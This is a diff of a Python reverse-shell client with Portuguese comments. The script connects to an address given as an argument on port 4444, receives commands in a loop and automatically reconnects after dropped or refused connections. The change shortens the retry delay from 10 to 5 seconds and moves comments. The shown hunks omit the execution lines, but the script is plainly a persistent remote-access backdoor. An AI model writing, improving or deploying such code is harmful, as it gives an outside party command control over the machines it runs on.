@@ -6,17 +6,19 @@ import subprocess
 import os, sys
 import time
 
-# criando socket e conectando
 ip = sys.argv[1]
 ip = socket.gethostbyname(ip)
 port = 4444
 
-# recebendo comandos
 def main():
     try:
+        # criando socket e conectando
+
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         s.connect((ip,port))
+
+        # recebendo comandos
 
         while True:
             command = s.recv(1024).decode()
@@ -35,17 +37,17 @@ def main():
                 
     except ConnectionResetError:
         s.close()
-        time.sleep(10)
+        time.sleep(5)
         main()
 
     except ConnectionAbortedError:
         s.close()
-        time.sleep(10)
+        time.sleep(5)
         main()
         
     except ConnectionRefusedError:
         s.close()
-        time.sleep(10)
+        time.sleep(5)
         main()           
                
 main()
